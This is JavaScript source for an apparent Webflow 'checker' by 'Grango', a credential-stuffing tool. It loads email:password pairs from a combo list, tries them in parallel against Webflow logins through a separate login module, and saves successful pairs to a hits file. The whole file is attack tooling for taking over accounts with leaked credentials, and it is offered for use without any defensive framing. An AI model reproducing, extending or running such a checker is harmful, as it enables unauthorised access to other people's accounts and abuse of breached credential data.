const readline = require('readline')
const figlet = require('figlet')
const chalk = require('chalk')
const languages = require('./misc/lang')
const flow = require('./misc/flow')
const fs = require('fs')
const os = require('os')

let config;
let language;
let combos = []
let stats = {
    threads: 0,
    pos: 0,
    hits: 0
}

this.credits = () => {
    process.title = `WebFlow checker by Grango - Hits: ${stats.hits} - Position: ${stats.pos}`;
    console.clear()
    console.log(chalk.rgb(89, 66, 244)(figlet.textSync('FlowChecker')))
    console.log('\n\nWebFlow checker by Grango\n\n')
    this.readConfig()
}

this.readConfig = () => {
    fs.readFile(`${__dirname}/config.json`, (error, data) => {
        if(error) return console.log(chalk.red('FILE_READ_ERROR'))

        try {
            config = JSON.parse(data)
        } catch(e) {
            return console.log(chalk.red('CONFIG_PARSE_ERROR'))
        }

        language =  languages.getTranslation(config.translationCode)
        console.log(chalk.rgb(89, 66, 244)(language.translations.configRead))
        this.readCombos()
    })
}

this.readCombos = () => {
    const rl = readline.createInterface(fs.createReadStream(`${__dirname}/combos.txt`))

    rl.on('line', (line) => {
        if(line.length <= 0) return;
        
        let splitted = line.split(':')

        if(splitted.length < 2) return;

        combos.push({email: splitted[0], pass: splitted[1]})
    })

    rl.on('close', () => {
        if(combos.length <= 0) return console.log(chalk.red(language.translations.noCombos))

        console.log(chalk.rgb(89, 66, 244)(`${combos.length} ${language.translations.combosLoaded}`))
        this.createThreads(0)
    })
}

this.thread = (credentials) => {
    if(combos[stats.pos] == undefined) return;

    flow.login(credentials.email, credentials.pass, language).then(result => {
        stats.hits++;
        fs.appendFileSync(`${__dirname}/hits.txt`, `${credentials.email}:${credentials.pass}${os.EOL}`)
        console.log(chalk.green(`${result} ${credentials.email}`))
    }).catch(error => {
        console.log(chalk.red(`${error} ${credentials.email}`))
    }).finally(() => {
        stats.pos++;
        this.thread(combos[stats.pos])
        process.title = `WebFlow checker by Grango - Hits: ${stats.hits} - Position: ${stats.pos}`;
    })
}

this.createThreads = (count) => {
    if(count < config.threads && combos[stats.pos] !== undefined) {
        this.thread(combos[stats.pos])
        stats.pos++;
        setTimeout(() => {
            this.createThreads(count+1)
        }, 400);
    }
}

this.credits()